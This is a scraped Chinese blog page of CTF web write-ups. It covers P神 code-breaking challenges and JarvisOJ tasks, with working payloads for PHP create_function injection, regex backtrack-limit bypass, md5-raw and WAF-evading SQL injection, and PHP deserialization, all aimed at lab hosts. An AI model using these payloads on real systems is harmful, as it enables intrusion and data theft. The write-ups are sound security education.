class="string">"\t性别："</span> + sex);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t体重："</span> + weight + <span class="string">"kg"</span>);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t地址："</span> + address);</span><br><span class="line">        System.out.<span class="keyword">println</span>(<span class="string">"\t婚否："</span> + isMarried);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/25/JAVA实训题/" data-id="cjvrp4gla002f5gqrn0218f44" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-湖湘杯web-WP" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/25/湖湘杯web-WP/" class="article-date">
  <time datetime="2019-03-24T16:00:00.000Z" itemprop="datePublished">2019-03-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/25/湖湘杯web-WP/">湖湘杯web_WP</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/25/湖湘杯web-WP/" data-id="cjvrp4gl400265gqr6vk5twwz" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-thinkphp搭建博客" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/24/thinkphp搭建博客/" class="article-date">
  <time datetime="2019-03-24T15:49:57.000Z" itemprop="datePublished">2019-03-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/24/thinkphp搭建博客/">thinkphp搭建博客</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        
      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/24/thinkphp搭建博客/" data-id="cjvrp4gka001b5gqrriy35ad8" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-p神代码审计知识星球二周年wp" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/24/p神代码审计知识星球二周年wp/" class="article-date">
  <time datetime="2019-03-24T15:46:30.000Z" itemprop="datePublished">2019-03-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/24/p神代码审计知识星球二周年wp/">p神代码审计知识星球二周年wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pud0uqipj30jg054gm5.jpg" alt=""></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>注: 如果是在服务器搭建环境 记得开放所有端口或者相应端口<br>在一个目录输入<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/phith0n/code-breaking.git</span><br></pre></td></tr></table></figure></p>
<p>然后进入一个题目目录，然后输入<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-compose up -d</span></span><br></pre></td></tr></table></figure></p>
<p>环境运行后，在docker-compose.yml中查看端口，访问即可</p>
<h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><p>端口8087<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1pu9e3j9sj30ng08smxf.jpg" alt=""><br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span><span class="comment">;</span></span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span></span><br></pre></td></tr></table></figure></p>
<p>双问号为三元运算表达式<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">c</span> = a ?? b<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">表示如果a非空，则c = a，</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">如果a为空，则 c = b；</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">等价于</span><br><span class="line"></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span><span class="comment">;</span></span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ? $_GET[<span class="string">'action'</span>]: <span class="string">''</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>即输入两个参数，若输入，则取我们的输入，否则为空<br>然后是对<code>$_GET[&#39;action&#39;]</code>的正则表达式过滤<br>因为正则里用了^$，那么有没有可能在开头或结尾加入某个字符来绕过正则<br>一旦绕过正则，则可以进行危险函数构造<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qfng2to2j30zf0hgn2b.jpg" alt=""><br>%5c 是 <code>/</code><br>仅当使用%5c打头时，我们可以正常运行var_dump()，并且成功满足正则。<br>那么这是为什么呢？<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\在php中表示默认的命名空间,所有原生函数和类都在这个命名空间中</span><br><span class="line">普通调用一个函数，如果直接写函数名<span class="function"><span class="keyword">function</span><span class="title">_name</span>(<span class="params"></span>)调用，调用的时候其实相当于写了一个相对路径；</span></span><br><span class="line"><span class="function">而如果写\<span class="function"><span class="keyword">function</span><span class="title">_name</span>(<span class="params"></span>) 这样调用函数，则其实是写了一个绝对路径。</span></span></span><br><span class="line"><span class="function"><span class="function">如果你在其他<span class="title">namespace</span>里调用系统类，就必须写绝对路径这种写法</span></span></span><br></pre></td></tr></table></figure></p>
<p>接下来需要找一个第二个参数可以引发危险的函数<br>string create_function ( string $args , string $code )<br>第一个参数控制函数的变量名，第二个参数控制函数内的代码<br>举例:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">create_function</span><span class="params">(<span class="string">'$fname'</span>,<span class="string">'echo $fname."可乐"'</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<p>等价于<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">类似于：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span><span class="params">(<span class="keyword">$fn</span>ame)</span> &#123;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="keyword">$fn</span>ame.<span class="string">"可乐"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来利用create_function() 注入<br>$arg = return “2333”;}phpinfo();/*<br>相当于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">($a,$b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"2333"</span>;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();</span><br><span class="line"><span class="comment">/*&#125;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qg8qk7saj30xi0fkace.jpg" alt=""><br>虽然create_function()已经移除了 但是还是会继续执行下面的phpinfo()</p>
<p>接下里进行读取目录<br>将phpinfo替换为print_r(scandir(‘../‘));即可<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?action=%5ccreate_function&amp;arg=<span class="keyword">return</span>%20<span class="string">"2333"</span>;&#125;print_r(scandir(%27../%27));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qgczt7smj30yb0a9757.jpg" alt=""><br>接下来读取文件内容<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=%5ccreate_function&amp;arg=<span class="keyword">return</span>%20<span class="string">"2333"</span>;&#125;print_r(file_get_contents(%27../flag_h0w2execute_arb1trary_c0de%27));<span class="comment">/*</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qgetyvmjj30xw086jrq.jpg" alt=""><br>得到flag</p>
<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><p>端口:8088<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_php($data)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    @mkdir($user_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>通过is_php()正则来检查$data的内容:即:<br>&lt;后面不能有问号，&lt;?后面不能有(;?&gt;反引号<br>题目并没有禁止我们上传php文件，但是对文件内容进行了过滤，禁止我们写入php代码。接下来就是绕过正则<br>在php7 中<br>tags都已经被移除 所以无法使用<br>&lt;%= phpinfo();<br>或者</p>
<p><script language="php">phpinfo();</script><br>接下来要利用 <strong>php正则回溯法</strong><br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p>
<p>涉及到正则匹配的流程，正则匹配有两种引擎<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">DFA:</span> 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</span><br><span class="line">NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</span><br></pre></td></tr></table></figure></p>
<p>php的PCRE库使用的就是NFA的正则引擎，就会涉及到回溯的一个过程。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qh5fwi9ij318q0g7762.jpg" alt=""><br>一开始 <code>.*</code>会将后面的全部字符匹配到，然后为了匹配<code>[(`;?&gt;]</code><br>然后就会一个字符一个字符的回溯，直到匹配到最后的; ，才会进行下一个<code>.*</code>的匹配</p>
<p>PHP为了防止正则表达式的拒绝服务攻击（回溯次数过多），限制了回溯的次数</p>
<p>在php5.2及之前这个次数为100000，之后一直到如今的7.2都是1000000<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1qhc3t99zj30tz09u3zu.jpg" alt=""><br>那么如果超过100万次会返回失败  即匹配失败<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(<span class="name">preg_match</span>('/&lt;\?.*[(`;?&gt;].*/is', '&lt;?php phpinfo()<span class="comment">;//'.str_repeat('a', 1000000)));</span></span><br><span class="line">bool(<span class="name">false</span>)</span><br></pre></td></tr></table></figure></p>
<h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>端口:82</p>
<h1 id="phplimit"><a href="#phplimit" class="headerlink" title="phplimit"></a>phplimit</h1><p>端口:8084<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>代码会将<code>$_GET[&#39;code&#39;]</code>中满足正则<code>/[^\W]+\((?R)?\)/</code>的部分，替换为空，然后查看是否剩下的部分强等于;<br>如果满足，则执行<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>($_GET[<span class="string">'code'</span>])<span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
<p>否则什么都不做。<br>首先是[^\W]<br>对于\W,其意思等价于[^A-Za-z0-9_]。<br>那么我们知道，我们的input必须以此开头<br>然后是括号匹配</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\( ...... \)</span><br></pre></td></tr></table></figure>
<p>括号中间为<br>(?R)?<br>意思为重复整个模式<br>简单理解，我们可以输入以下类型</p>
<p>a(b(c()))<br>但我们不能加参数,否则将无法匹配</p>
<p>a(c,d)<br>所以正则看完，题目的意思非常明确了：<br>我们只能input函数，但函数中不能使用参数，否则判断句右边经过替换，将不止剩余分号;</p>
<p>那么有没有办法通过无参数函数，达到RCE的目的呢？答案显然是不可能的，没有参数，怎么传递我们需要执行的指令呢？</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/24/p神代码审计知识星球二周年wp/" data-id="cjvrp4gj900175gqrbnyn7er8" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-JarvisOj-Writeup" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/03/24/JarvisOj-Writeup/" class="article-date">
  <time datetime="2019-03-24T15:25:19.000Z" itemprop="datePublished">2019-03-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/03/24/JarvisOj-Writeup/">JarvisOj-Writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g22a8pyxgzj30cx0g73zq.jpg" alt=""><br><a href="https://ws1.sinaimg.cn/large/005RaR9Jgy1g22a90m46bj30hs0mlgm8.jpg" target="_blank" rel="noopener">https://ws1.sinaimg.cn/large/005RaR9Jgy1g22a90m46bj30hs0mlgm8.jpg</a></p>
<h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bubaauujj30i704j0so.jpg" alt=""><br>单纯的我输入：<a href="http://web.jarvisoj.com:51" target="_blank" rel="noopener">http://web.jarvisoj.com:51</a><br>发现不是,如果不是目的端口,那就是源端口了<br>源端口就是指本地端口<br>目的端口就是远程端口<br>很多人都在源端口和目的端口这两个概念上犯迷糊，<br>其实他们只是数据的发送方向的问题。<br>比如很多防火墙的规则设置都要求设置源端口和目的端口，<br>其实就是数据包通过防火墙的方向是向内还是向外。<br><strong>源端口就是本机程序用来发送数据的端口，目的端口就是对方主机用哪个端口接收</strong></p>
<p>利用curl 命令<br>curl –local-port 51 <a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv3dnzd1j30j308ajtu.jpg" alt=""></p>
<h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv6laii0j30fd039q2t.jpg" alt=""><br>直接构造X-Forwarded-For:127.0.0.1发包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv75a1hij30m207wjup.jpg" alt=""></p>
<h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bv7wk5a2j30d503f74d.jpg" alt=""><br>在header里有提示<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvagk7ndj30jn05aabg.jpg" alt=""><br>这是因<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">md5()函数有两个参数，一个是要加密的字符串，另一个是输出格式</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvgi6fn5j30p109kwet.jpg)</span><br><span class="line">默认为false</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvnplslfj30sd05it98.jpg)</span><br><span class="line">当加上true时</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvsj88x1j30rj06zaaq.jpg)</span><br><span class="line">select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bvz1j8ymj310c06qwfk.jpg)</span><br><span class="line">拼接之后就变成了</span><br><span class="line">SELECT * FROM admin WHERE pass = &apos;&apos;or&apos;6&lt;trash&gt;&apos;</span><br><span class="line">提交 ffifdyop 即可</span><br><span class="line"></span><br><span class="line"># 神盾局的秘密</span><br><span class="line">查看源码，发现img值被base64 尝试读取showimg.php</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw339cgfj30ek02v74e.jpg)</span><br><span class="line">view-source:http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw4ssxmkj30nz055wei.jpg)</span><br><span class="line">这是用来过滤的,再看Index.php</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw74j261j30gg05jjrd.jpg)</span><br><span class="line">可能涉及到反序列化，接着读取shield.php</span><br><span class="line">![](https://ws1.sinaimg.cn/large/005RaR9Jgy1g1bw98tow9j30lx07aq33.jpg)</span><br><span class="line">构造序列化</span><br></pre></td></tr></table></figure></p>
<p>&lt;?php<br>    //flag is in pctf.php<br>    class Shield {<br>        public $file;<br>        function __construct($filename = ‘’) {<br>            $this -&gt; file = $filename;<br>        }</p>
<pre><code>    function readfile() {
        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  
        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
            return @file_get_contents($this-&gt;file);
        }
    }
}
$x = new Shield(&apos;pctf.php&apos;);
echo serialize($x);
</code></pre><p>?&gt;</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">6</span>:<span class="string">"Shield"</span>:<span class="number">1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"pctf.php"</span>;&#125;</span><br><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwfup2wnj30rk06h3z0.jpg)</span></span><br><span class="line"></span><br><span class="line"># IN A Mess</span><br><span class="line"></span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwi4jn68j30et044glt.jpg)</span></span><br><span class="line">看到个ID参数，本能的尝试sql注入测试</span><br><span class="line">查看源码</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwmsk9v1j30h0032q33.jpg)</span></span><br><span class="line">访问index.phps,是一道代码审计</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bwnf2m4jj30t70d3t99.jpg)</span></span><br><span class="line"></span><br><span class="line">id：id==<span class="number">0</span>典型的PHP弱比较，利用id=<span class="number">0</span>a或id=<span class="number">0</span>e123或id=asd均可实现绕过</span><br><span class="line"></span><br><span class="line">b：strlen($b)&gt;<span class="number">5</span> and eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) and substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>) 这里要求：b的长度大于<span class="number">5</span>，且是基于eregi函数的弱类型，用%<span class="number">00</span>的绕过（ strlen函数对%<span class="number">00</span>不截断但substr截断）那么可以令b=%<span class="number">00411111</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">data</span>: 用<span class="attribute">php</span>:<span class="comment">//input,data 协议</span></span><br><span class="line">?id=<span class="number">0</span>e&amp;a=<span class="attribute">data</span>:,<span class="number">1112%</span><span class="number">20</span>is%<span class="number">20</span>a%<span class="number">20</span>nice%<span class="number">20</span>lab!&amp;b=%<span class="number">00411111</span></span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxndjerhj30cn03vq2q.jpg)</span></span><br><span class="line">发现不是flag 于是访问一下</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxqnf23ij30c5023t8h.jpg)</span></span><br><span class="line">进行sql注入测试  </span><br><span class="line">发现过滤空格</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxrl2a57j305n0150np.jpg)</span></span><br><span class="line">用<span class="built_in">``</span><span class="built_in">` /*1*/ `</span><span class="built_in">``</span>进行绕过</span><br><span class="line">![](<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1bxtnvrsuj30c3021we9.jpg)</span></span><br><span class="line">猜解字段</span><br></pre></td></tr></table></figure>
<p>id=1/<em>1</em>/order/<em>1</em>/by/<em>1</em>/3<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发现<span class="class"><span class="keyword">union</span> <span class="title">select</span> 等关键词也被<span class="title">waf</span>，用双写进行绕过</span></span><br></pre></td></tr></table></figure></p>
<p>/index.php?id=-1/<em>1</em>/ununionion/<em>1</em>/sselectelect/<em>1</em>/1,2,3<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1by4543n9j30400100cb.jpg)</span></span><br><span class="line">接下来进行常规注入</span><br></pre></td></tr></table></figure></p>
<p>id=-1/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/1,2,database()#<br>index.php?id=-1/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/1,2,group_concat(id,context,title)/<em>1</em>/frfromom/<em>1</em>/content#<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">![](<span class="symbol">https:</span>/<span class="regexp">/ws1.sinaimg.cn/large</span><span class="regexp">/005RaR9Jgy1g1by6jgs7sj30co01rgle.jpg)</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp"># RE?</span></span><br><span class="line"><span class="regexp">下载下来后文件名为udf.so.XXXXX，用mysql导入一下。具体过程如下。</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">将udf文件放到/usr</span><span class="regexp">/lib/mysql</span><span class="regexp">/plugin/</span>文件夹中：</span><br><span class="line"></span><br><span class="line">/usr/<span class="class"><span class="keyword">lib</span>/<span class="title">mysql</span>/<span class="title">plugin</span><span class="comment"># wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</span></span></span><br><span class="line"></span><br><span class="line">登陆mysql后，加载help_me函数：</span><br></pre></td></tr></table></figure></p>
<p>mysql&gt; create function help_me returns string soname ‘udf.so.02f8981200697e5eeb661e64797fc172’;<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用<span class="selector-tag">help_me</span>函数：</span><br><span class="line">!<span class="selector-attr">[]</span>(<span class="attribute">https</span>:<span class="comment">//ws1.sinaimg.cn/large/005RaR9Jgy1g1byabzqy7j30ii046dfu.jpg)</span></span><br><span class="line">利用udf再创建一个getflag函数。</span><br></pre></td></tr></table></figure></p>
